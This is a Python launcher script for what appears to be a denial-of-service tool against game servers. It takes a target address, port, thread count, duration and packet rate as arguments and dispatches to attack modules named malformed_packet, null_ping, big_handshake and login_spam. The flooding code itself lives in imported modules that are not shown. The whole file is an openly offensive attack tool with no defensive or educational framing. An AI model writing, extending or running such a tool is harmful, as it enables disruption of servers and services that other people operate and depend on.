from packet import malformed_packet, null_ping, big_handshake, login_spam
from argparse import ArgumentParser, ArgumentTypeError


def check_module(module):
    modules = ["malformed_packet", "null_ping", "big_handshake", "login_spam"]
    if module in modules:
        return module
    raise ArgumentTypeError("Module not in list:", modules)


if __name__ == '__main__':
    parser = ArgumentParser()
    required = parser.add_argument_group('required arguments')
    required.add_argument("-t", dest="time",
                          help="Time of attack", required=True)
    required.add_argument("-th", dest="threads",
                          help="Number of threads used to attack", required=True)
    required.add_argument("-a", dest="address",
                          help="Address of attacked server", required=True)
    required.add_argument("-p", dest="port",
                          help="Port of attacked server", required=True)
    required.add_argument("-pps", dest="pps",
                          help="Packet per second (-1 = unlimited)", required=True)
    required.add_argument("-m", dest="module",
                          help="Attack module", required=True, type=check_module)
    parser.add_argument("-pv", dest="protocol",
                        help="Protocol version")
    args = parser.parse_args()
    if args.module == "malformed_packet":
        malformed_packet.MalformedPacket(int(args.time), int(args.threads), args.address, int(args.port), int(args.pps))
    elif args.module == "null_ping":
        null_ping.NullPing(int(args.time), int(args.threads), args.address, int(args.port), int(args.pps))
    elif args.module == "big_handshake":
        big_handshake.BigHandshake(int(args.time), int(args.threads), args.address, int(args.port), int(args.pps))
    elif args.module == "login_spam":
        if args.protocol is not None:
            login_spam.LoginSpam(int(args.time), int(args.threads), args.address, int(args.port), int(args.pps),
                                 int(args.protocol))
        else:
            print("Specify protocol version -pv")
